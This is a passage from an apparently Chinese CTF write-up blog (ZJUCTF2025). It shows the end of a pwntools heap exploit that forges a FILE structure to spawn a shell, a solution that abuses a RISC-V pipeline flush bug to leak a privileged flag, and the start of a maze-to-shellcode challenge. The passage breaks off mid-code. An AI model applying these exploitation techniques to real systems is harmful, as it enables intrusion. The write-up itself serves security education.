class="built_in">str</span>(<span class="number">4919</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one_pull</span>():</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    response = <span class="string">b""</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        line = p.recvline()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b"("</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        response += line</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    <span class="keyword">return</span> extract_and_pack(response.decode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_history</span>():</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_seed</span>(<span class="params">seed</span>):</span><br><span class="line">    sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">    sla(<span class="string">b"Enter seed:"</span>, <span class="built_in">str</span>(seed))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, num, content</span>):</span><br><span class="line">    clear_history()</span><br><span class="line">    seed_list = find_seeds_for_each_byte(num)</span><br><span class="line">    <span class="comment"># seed_list = [566, 47, 466, 417, 197, 104]</span></span><br><span class="line">    <span class="built_in">print</span>(seed_list)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</span><br><span class="line">        set_seed(seed)</span><br><span class="line">        one_pull()</span><br><span class="line">    add(idx, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_seeds_for_each_byte</span>(<span class="params">value</span>):</span><br><span class="line">    seeds = []</span><br><span class="line">    context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">    io = process(<span class="string">"./vuln"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        target_byte = (value &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> target_byte == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2</span>**<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">4919</span>))</span><br><span class="line">                io.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line">                io.sendlineafter(<span class="string">b"Enter seed:"</span>, <span class="built_in">str</span>(seed))</span><br><span class="line">                io.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">                response = <span class="string">b""</span>                </span><br><span class="line">                <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                    line = io.recvline()</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b"("</span> <span class="keyword">not</span> <span class="keyword">in</span> line:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    response += line</span><br><span class="line">                val = extract_and_pack(response.decode())</span><br><span class="line">                <span class="keyword">if</span> val == target_byte:</span><br><span class="line">                    <span class="built_in">print</span>(val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f"[+] Found seed for byte <span class="subst">{i}</span>: <span class="subst">{seed}</span>"</span>)</span><br><span class="line">                    seeds = [seed] + seeds</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError:</span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"[-] Could not find seed for byte <span class="subst">{i}</span>"</span>)</span><br><span class="line">            seeds.append(<span class="literal">None</span>)</span><br><span class="line">    context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> seeds</span><br><span class="line"></span><br><span class="line">chance()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i ,<span class="string">b"A"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">fd = show(<span class="number">0</span>)</span><br><span class="line">heap_base = fd &lt;&lt; <span class="number">12</span></span><br><span class="line">success(<span class="string">f"heap_base =》 <span class="subst">{<span class="built_in">hex</span>(heap_base)}</span>"</span>)</span><br><span class="line"><span class="built_in">print</span>(fd)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">leak = show(<span class="number">7</span>)</span><br><span class="line">libc_base = leak - (<span class="number">0x78dbcc803b20</span> - <span class="number">0x78dbcc600000</span>)</span><br><span class="line">success(<span class="string">f"libc_base =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">"_IO_list_all"</span>] - <span class="number">0x20</span></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">"__environ"</span>] - <span class="number">0x28</span></span><br><span class="line">success(<span class="string">f"environ =&gt; <span class="subst">{<span class="built_in">hex</span>(environ)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">new_fp = heap_base + <span class="number">0x330</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, IO_list_all ^ (fd), <span class="string">b"AAAA"</span>)</span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">0x20</span>- <span class="number">0x14</span>)</span><br><span class="line">payload += p64(new_fp)</span><br><span class="line">add(<span class="number">9</span>, payload)</span><br><span class="line">add(<span class="number">10</span>, payload)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">new_vtable = libc_base + libc.sym[<span class="string">"_IO_wfile_jumps"</span>] + <span class="number">0x30</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">heap = heap_base</span><br><span class="line">io_payload = flat({</span><br><span class="line">    <span class="number">0x00</span>:<span class="string">b"  sh\x00"</span>,          <span class="comment"># _flag</span></span><br><span class="line">    <span class="number">0x18</span>:pack(<span class="number">0</span>),           <span class="comment"># read_base     </span></span><br><span class="line">    <span class="number">0x20</span>:pack(<span class="number">0</span>),           <span class="comment"># write_base     _wide_data.write_base</span></span><br><span class="line">    <span class="number">0x28</span>:pack(<span class="number">1</span>),           <span class="comment"># write_ptr      _wide_data.write_ptr</span></span><br><span class="line">    <span class="number">0x88</span>:pack(heap) ,        <span class="comment"># lock</span></span><br><span class="line">    <span class="number">0xa0</span>:pack(new_fp+<span class="number">8</span>),           <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xb8</span>:pack(system),  </span><br><span class="line">    <span class="number">0xc0</span>:pack(<span class="number">1</span>),           <span class="comment"># mode</span></span><br><span class="line">    <span class="number">0xd8</span>:pack(new_vtable),   <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0xe8</span>:pack(new_fp+<span class="number">0xa0</span>),           <span class="comment"># _wide_vtable</span></span><br><span class="line">},filler=<span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell_number = u32(<span class="string">b"  sh"</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b"A"</span> * (<span class="number">0x330</span> - <span class="number">0x2b0</span> - <span class="number">4</span>) + io_payload[:<span class="number">0x30</span>]) <span class="comment"># prev | size | fd | bk | =&gt; 0x20</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b"A"</span> * <span class="number">0x14</span> + io_payload[<span class="number">0x88</span>:])</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">9</span>))</span><br><span class="line"></span><br><span class="line">inter()</span><br><span class="line"><span class="comment"># _IO_switch_to_wget_mode</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126001455360.png"></p>
<p>flag：<code>ZJUCTF{my_+urn!dr@wwwww!5imp1e_U4F_on_+c@che}</code></p>
<h3 id="cs_master">7 cs_master</h3>
<blockquote>
<p>那是一个阳光明媚的下午，实习下班后我与kid走在公司楼下的小路上</p>
<p>kid：我今天看了一个很有意思的题，他是一个cpu的pwn</p>
<p>我：还有这种pwn</p>
<p>kid：他就是把flag......然后.....最后......结果......我感觉还挺有意思的</p>
<p>我：（叽里咕噜说什么呢）</p>
</blockquote>
<p>题目是一个简易的支持<code>risc-v32</code>指令集的五级流水线CPU</p>
<p>在最开始运行时会把<code>flag</code>载入内存，然后再MEM READ时会判断是否有特权信号，如果有的话则读flag，没有则读正常内存</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Common::*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> RAM (</span><br><span class="line">    <span class="keyword">input</span> <span class="keyword">logic</span>   clk,</span><br><span class="line">    <span class="keyword">input</span> <span class="keyword">logic</span>   rst,</span><br><span class="line">    <span class="keyword">input</span> Signals i_signals,</span><br><span class="line">    <span class="keyword">input</span> <span class="keyword">logic</span>   i_privileged,</span><br><span class="line"></span><br><span class="line">    <span class="keyword">output</span> Signals o_signals</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">logic</span> [<span class="number">31</span>:<span class="number">0</span>] secret[<span class="number">0</span>:<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">initial</span> <span class="built_in">$readmemh</span>(<span class="string">"flag.mem"</span>, secret);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">parameter</span> <span class="keyword">int</span> RAM_WORDS = (<span class="number">36</span> * <span class="number">125</span> * <span class="number">30</span> / <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">logic</span> [<span class="number">31</span>:<span class="number">0</span>] ram[<span class="number">0</span>:RAM_WORDS-<span class="number">1</span>];</span><br><span class="line">	</span><br><span class="line">    ...........</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Memory read logic</span></span><br><span class="line">    <span class="keyword">always_comb</span> <span class="keyword">begin</span></span><br><span class="line">        mem_rdata = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i_signals<span class="variable">.memr</span>) <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">case</span> (idx[<span class="number">31</span>:<span class="number">30</span>])</span><br><span class="line">                <span class="number">'b00</span>: mem_rdata = ram[idx&gt;&gt;<span class="number">2</span>];</span><br><span class="line">                <span class="number">'b10</span>: <span class="keyword">begin</span></span><br><span class="line">                    PRIVILEGED(i_privileged);</span><br><span class="line">                    mem_rdata = secret[off&gt;&gt;<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">endcase</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output logic</span></span><br><span class="line">    <span class="keyword">always_comb</span> <span class="keyword">begin</span></span><br><span class="line">        o_signals = i_signals;</span><br><span class="line">        <span class="keyword">if</span> (i_signals<span class="variable">.memr</span>) <span class="keyword">begin</span></span><br><span class="line">            <span class="keyword">logic</span> [<span class="number">31</span>:<span class="number">0</span>] loaded_data;</span><br><span class="line">            <span class="keyword">case</span> (i_signals<span class="variable">.memt</span>)</span><br><span class="line">                LoadByte:  loaded_data = <span class="number">32</span>'(<span class="keyword">signed</span>'(mem_rdata[shift+:<span class="number">8</span>]));</span><br><span class="line">                ULoadByte: loaded_data = <span class="number">32</span>'(<span class="keyword">unsigned</span>'(mem_rdata[shift+:<span class="number">8</span>]));</span><br><span class="line">                LoadHalf:  loaded_data = <span class="number">32</span>'(<span class="keyword">signed</span>'(mem_rdata[shift+:<span class="number">16</span>]));</span><br><span class="line">                ULoadHalf: loaded_data = <span class="number">32</span>'(<span class="keyword">unsigned</span>'(mem_rdata[shift+:<span class="number">16</span>]));</span><br><span class="line">                LoadWord:  loaded_data = mem_rdata;</span><br><span class="line">                <span class="keyword">default</span>:   loaded_data = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">endcase</span></span><br><span class="line">            o_signals<span class="variable">.wdata</span> = <span class="number">33</span>'(loaded_data);</span><br><span class="line">        <span class="keyword">end</span> <span class="keyword">else</span> <span class="keyword">begin</span></span><br><span class="line">            o_signals<span class="variable">.wdata</span> = i_signals<span class="variable">.wdata</span>;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
<p>所以目的很明确是在读取内存的时候<code>priviledge</code>信号是<code>1</code></p>
<p>看一下这个信号是从哪里发射的</p>
<figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Opcode::System: <span class="keyword">begin</span></span><br><span class="line">                o_signals<span class="variable">.op</span>        = Op::Add;</span><br><span class="line">                o_signals<span class="variable">.wreg</span>      = <span class="number">0</span>;</span><br><span class="line">                o_signals<span class="variable">.wback</span>     = <span class="number">0</span>;</span><br><span class="line">                o_signals<span class="variable">.sys_wback</span> = <span class="number">0</span>;</span><br><span class="line">                o_signals<span class="variable">.asel</span>      = Register;</span><br><span class="line">                o_signals<span class="variable">.bsel</span>      = Nothing;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> (i_insn<span class="variable">.i</span><span class="variable">.funct3</span>)</span><br><span class="line">                    <span class="number">'h0</span>: <span class="keyword">begin</span></span><br><span class="line">                        <span class="keyword">case</span> (i_insn<span class="variable">.i</span><span class="variable">.imm</span>)</span><br><span class="line">                            <span class="number">'h000</span>: <span class="keyword">begin</span></span><br><span class="line">                                o_signals<span class="variable">.op</span>        = Op::Add;</span><br><span class="line">                                o_signals<span class="variable">.wreg</span>      = <span class="number">0</span>;</span><br><span class="line">                                o_signals<span class="variable">.wback</span>     = <span class="number">0</span>;</span><br><span class="line">                                o_signals<span class="variable">.sys_wback</span> = <span class="number">1</span>;</span><br><span class="line">                                o_signals<span class="variable">.asel</span>      = ProgramCounter;</span><br><span class="line">                                o_signals<span class="variable">.bsel</span>      = NextInsn;</span><br><span class="line">                                o_privileged_out    = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">end</span></span><br><span class="line">                            <span class="number">'h102</span>: <span class="keyword">begin</span></span><br><span class="line">                                PRIVILEGED(i_privileged_in);</span><br><span class="line">                                o_privileged_out = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">end</span></span><br><span class="line">                            <span class="keyword">default</span>: <span class="keyword">begin</span></span><br><span class="line">                                <span class="built_in">$display</span>(<span class="string">"unhandled system instruction"</span>);</span><br><span class="line">                                <span class="built_in">$finish</span>;</span><br><span class="line">                            <span class="keyword">end</span></span><br><span class="line">                        <span class="keyword">endcase</span></span><br></pre></td></tr></table></figure>
<p>是在<code>ID</code>解码阶段<code>Control</code>模块里发射出来的，判断这是<code>System</code>的指令就会设置<code>priviledge</code>信号为1</p>
<p>但这里同时会设置跳转信号为<code>ALWAYS</code>，之前一直在想我如何能让他跳转信号不为<code>1</code>，所以一直在想伪造指令，但一直都不行。</p>
<p>后面关注到了阶段间寄存器的写法，<code>IF_ID</code>和<code>ID_EXE</code>没有问题，但<code>EXE_MEM</code>发现这里没有<code>flush</code>....我忘了原本的有没有<code>flush</code>了</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126002533793.png"></p>
<p>但这就有一个问题，<code>ecall</code>指令是在<code>ID</code>阶段解码的，信号在下一个周期发出，<code>priviledge</code>信号也会同时发出，<code>ld</code>指令在<code>MEM</code>阶段执行</p>
<p>也就是说，如果是下面这样的代码片段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lw .....</span><br><span class="line">ecall</span><br></pre></td></tr></table></figure>
<p>那么很不幸<code>lw</code>指令执行会和<code>priviledge</code>信号发出处在同一拍！我们就可以通过这一拍的缝隙，将flag里面的4字节读取到寄存器中</p>
<p>远端执行脚本在运行结束会给我们打印出所有寄存器的数值，我们就可以通过这个方法来泄露<code>flag</code></p>
<p>但打远端的时候发现，远端碰到<code>ecall</code>指令就会卡死，想了个办法，我们可以不去碰<code>ecall</code>，因为<code>privilidge</code>并不在<code>flush</code>的信号内，如果不涉及到特权态切换，<code>privilidge</code>就会保持原样，所以我们可以通过<code>ecall</code>指令解码去骗信号，但不执行，形如如下的片段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">	bne ....., exploit</span><br><span class="line">	ecall</span><br><span class="line">exploit:</span><br><span class="line">	lw ......</span><br></pre></td></tr></table></figure>
<p>信号骗到手就可以~</p>
<p>远端交互脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_program_bytes</span>(<span class="params">code_bytes</span>):</span><br><span class="line">    <span class="built_in">print</span>(code_bytes)</span><br><span class="line">    b64 = base64.b64encode(code_bytes).decode(<span class="string">"ascii"</span>)</span><br><span class="line">    <span class="comment"># run run.py and feed the base64 string to its stdin</span></span><br><span class="line">    <span class="built_in">print</span>(b64)</span><br><span class="line">    <span class="comment"># p = remote("127.0.0.1", 62048)</span></span><br><span class="line">    p = websocket(<span class="string">"wss://ctf.zjusec.com/api/proxy/b4865bc0-2175-4fdf-a7f4-eb161ebc4912"</span>)</span><br><span class="line">    context.log_level = <span class="string">"debug"</span></span><br><span class="line">    p.sendlineafter(<span class="string">b"give me your code: "</span>, b64)</span><br><span class="line">    <span class="comment"># proc = subprocess.run([sys.executable, 'run.py'], input=b64 + '\n', text=True, capture_output=True)</span></span><br><span class="line">    <span class="comment"># print('--- run.py stdout ---')</span></span><br><span class="line">    <span class="comment"># print(proc.stdout)</span></span><br><span class="line">    <span class="comment"># print('--- run.py stderr ---')</span></span><br><span class="line">    <span class="comment"># print(proc.stderr)</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">return</span> proc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"main.bin"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line">        run_program_bytes(code)</span><br></pre></td></tr></table></figure>
<p>本地编译.s为二进制：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">riscv64-unknown-elf-as -march=rv32i main.s -o main.o</span><br><span class="line">riscv64-unknown-elf-objcopy -j .text -O binary main.o main.bin</span><br><span class="line">python3 interact_with_runpy.py</span><br></pre></td></tr></table></figure>
<p>攻击代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">leak:</span><br><span class="line">    LUI x1, 0x80000</span><br><span class="line">    jal x2, target</span><br><span class="line">    ecall</span><br><span class="line">target:</span><br><span class="line">    LUI x1, 0x80000</span><br><span class="line">    lw x3, 0(x1)</span><br></pre></td></tr></table></figure>
<p>通过n次重复运行该脚本（改lw的偏移），拿到全部<code>flag</code>如下：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 0x43554a5a</span></span><br><span class="line"><span class="meta"># 0x797b4654</span></span><br><span class="line"><span class="meta"># 0x6d5f7530</span></span><br><span class="line"><span class="meta"># 0x5f743575</span></span><br><span class="line"><span class="meta"># 0x345f3362</span></span><br><span class="line"><span class="meta"># 0x6d30635f</span></span><br><span class="line"><span class="meta"># 0x33747570</span></span><br><span class="line"><span class="meta"># 0x79355f72</span></span><br><span class="line"><span class="meta"># 0x6d337435</span></span><br><span class="line"><span class="meta"># 0x35406d5f</span></span><br><span class="line"><span class="meta"># 0x7d723374</span></span><br></pre></td></tr></table></figure>
<p>flag：<code>ZJUCTF{y0u_mu5t_b3_4_c0mput3r_5y5t3m_@5t3r}</code></p>
<h3 id="unluckey">8 unluckey</h3>
<p>题目大意是我们输入一个种子，就会为我们生成一个迷宫</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126152107075.png"></p>
<p>之后允许在迷宫里使用wasd走，每一个有效的走步（不撞墙，不越界）最后都会被转译为一段二进制，所有有效走步转义的二进制拼接到一起填充到一段程序分配得到可读可写可执行的内存段作为shellcode执行：</p>
<p><img src="/2025/11/29/ZJUCTF2025/image-20251126152352098.png"></p>
<p>题目同时给出了一个后门函数：</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_12A9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/sh"</span>)</span></span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>所以如何保证shellcode的连续性（也就是shellcode转义为一串走步，每一步都是有效的）是这个题的关键。</p>
<p>首先我们给出两个用户调试的函数，第一个是把wasd转义为shellcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode_wasd_to_bytecode</span>(<span class="params">wasd_string: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 核心编码映射表</span></span><br><span class="line">    CODE_MAP = {</span><br><span class="line">        <span class="string">'w'</span>: <span class="number">0b00</span>,</span><br><span class="line">        <span class="string">'d'</span>: <span class="number">0b01</span>,</span><br><span class="line">        <span class="string">'s'</span>: <span class="number">0b10</span>,</span><br><span class="line">        <span class="string">'a'</span>: <span class="number">0b11</span>,</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    encoded_bytes: <span class="type">List</span>[<span class="built_in">int</span>] = []</span><br><span class="line">    </span><br><span class="line">    current_byte = <span class="number">0</span></span><br><span class="line">    bit_count = <span class="number">0</span> <span class="comment"># 当前 byte 中已填充的位数 (0, 2, 4, 6)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 原始指令列表 (用于日志，已过滤非法字符并转为小写)</span></span><br><span class="line">    valid_instructions: <span class="type">List</span>[<span class="built_in">str</span>] = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 1. 编码阶段：按 2 位逐位打包指令 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(wasd_string.lower()):</span><br><span class="line">        <span class="comment"># 查找 2-bit 代码</span></span><br><span class="line">        code = CODE_MAP.get(char)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"警告: 发现非法字符 '<span class="subst">{char}</span>' (位置 <span class="subst">{i}</span>)。跳过该字符。"</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span 